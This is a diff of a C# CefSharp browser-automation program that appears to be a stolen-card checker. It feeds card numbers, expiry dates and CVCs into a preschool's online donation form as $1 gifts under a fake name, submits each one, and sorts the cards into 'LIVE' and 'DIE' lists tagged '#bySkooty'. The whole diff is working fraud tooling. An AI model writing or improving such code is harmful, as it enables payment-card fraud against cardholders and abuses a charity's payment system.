@@ -196,8 +196,8 @@ namespace CefSharp.MinimalExample.WinForms
                 Console.WriteLine(ex);
                 throw;
             }
-                                
-            //'lblContador.Text = Convert.ToString(DataGridView1.Rows.Count - 1)            
+
+            lblContador.Text = Convert.ToString(dgwDataCard.Rows.Count - 1);            
 
             for (int i = 0; i < dgwDataCard.ColumnCount - 1; i++)
             {
@@ -217,6 +217,10 @@ namespace CefSharp.MinimalExample.WinForms
             {
                 if (row.Index != dgwDataCard.Rows.Count - 1 && row.Index >= 0)
                 {
+                    lblStatus.Text = "Autorizando donaciones...#" + Convert.ToString(row.Index + 1);
+                    lblStatus.ForeColor = Color.Blue;
+                    row.DefaultCellStyle.BackColor = Color.LightSkyBlue;
+
                     browser.Load("about:blanck");
                     ready = false;
                     browser.Load("https://druidhillspreschool.org/relocate/index.php");
@@ -225,21 +229,33 @@ namespace CefSharp.MinimalExample.WinForms
                     {
                         Console.WriteLine("No ready!");
                     }
-                    ProcessDonations(row.Index);
+                    var success = ProcessDonations(row.Index);
+                    if (success)
+                    {
+                        lstAprobadas.Items.Add("🎶 LIVE " + row.Cells[0].Value + "|" + row.Cells[1].Value + "|" + row.Cells[2].Value + "|" + row.Cells[3].Value + " $ #bySkooty");
+                        lblStatus.Text = "Autorizando donaciones...Aprovada";
+                        lblStatus.ForeColor = Color.Lime;
+                        row.DefaultCellStyle.BackColor = Color.Green;
+                        lblLiveContador.Text = lstAprobadas.Items.Count.ToString();
+                    }
+                    else
+                    {
+                        lstRechazadas.Items.Add("✗ DIE " + row.Cells[0].Value + "|" + row.Cells[1].Value + "|" + row.Cells[2].Value + "|" + row.Cells[3].Value + "  #bySkooty");
+                        lblStatus.Text = "Autorizando donaciones...Reprovada";
+                        lblStatus.ForeColor = Color.Red;
+                        row.DefaultCellStyle.BackColor = Color.Red;
+                        lblDeadContador.Text = lstRechazadas.Items.Count.ToString();
+                    }
                 }                    
             }
+            lblStatus.Text = "Proceso de autorización de donaciones finalizado";
+            lblStatus.ForeColor = Color.Black;
             browser.Load("about:blanck");
         }
 
-        private void ProcessDonations(int index)
+        private bool ProcessDonations(int index)
         {
-            var row = dgwDataCard.Rows[index];
-            lblStatus.Text = "Autorizando donaciones...#" + Convert.ToString(row.Index + 1);
-            lblStatus.ForeColor = Color.Blue;
-            row.DefaultCellStyle.BackColor = Color.LightSkyBlue;
-
-
-
+            var card = dgwDataCard.Rows[index];                        
             browser.EvaluateScriptAsync("document.getElementsByName('radio_amount')[5].checked=true").Wait();
             browser.EvaluateScriptAsync("document.getElementsByName('other_amount')[0].value='1'").Wait();
             browser.EvaluateScriptAsync("document.getElementsByName('name')[0].value='piero espire'").Wait();
@@ -247,50 +263,39 @@ namespace CefSharp.MinimalExample.WinForms
             browser.EvaluateScriptAsync("document.getElementsByName('cardholder_name')[0].value='piero espire'").Wait();
 
 
-            var carNumber = Convert.ToString(row.Cells[0].Value);
+            var carNumber = Convert.ToString(card.Cells[0].Value);
             browser.EvaluateScriptAsync($"document.querySelector('input[data-stripe=\"number\"]').value='{carNumber}'").Wait();
 
-            var carExpireMonth = Convert.ToByte(row.Cells[1].Value).ToString();
+            var carExpireMonth = Convert.ToByte(card.Cells[1].Value).ToString();
             browser.EvaluateScriptAsync($"document.querySelector('select[data-stripe=\"exp-month\"]').value='{carExpireMonth}'").Wait();
 
-            var carExpireYear = Convert.ToInt32(row.Cells[2].Value).ToString();
+            var carExpireYear = Convert.ToInt32(card.Cells[2].Value).ToString();
             browser.EvaluateScriptAsync($"document.querySelector('select[data-stripe=\"exp-year\"]').value='{carExpireYear}'").Wait();
 
-            var carCvc = Convert.ToString(row.Cells[3].Value);
+            var carCvc = Convert.ToString(card.Cells[3].Value);
             browser.EvaluateScriptAsync($"document.getElementsByName('cvc')[0].value='{carCvc}'").Wait();
-
             
             browser.EvaluateScriptAsync($"document.getElementsByTagName('button')[0].click()").Wait();
 
-            var gogo = false;
-            while (!gogo)
+            var donationSuccess = false;
+            var feedback = false;            
+            while (!feedback)
             {                
                 browser.GetSourceAsync().ContinueWith(taskHtml =>
                 {
                     string html = taskHtml.Result;
-                    var contain = html.Contains(@"<h2>Oh Snap!</h2>");
-
-                    if (contain)
+                    var fail = html.Contains(@"<h2>Oh Snap!</h2>");
+                    var success = html.Contains(@"<h2>Thank You!</h2>");
+                    if (fail || success)
                     {
-                        gogo = true;
+                        feedback = true;
+                        donationSuccess = success;
                     }
-                }).Wait();
-                if (gogo)
-                {
-                    Console.Write("sigue");
-                }
-                else
-                {
-                    Console.Write("sigue NO");
-                }
+                }).Wait();                
             }
-            ////ContinueWith(
-            //    //Sub(x)
-            //'    If x.IsCompleted Then
-            //'        canReadResult = True
-            //'    End If
-            //'End Sub)
-            //Thread.Sleep(20000);
+            Thread.Sleep(1000);
+            return donationSuccess;
         }
+
     }
 }
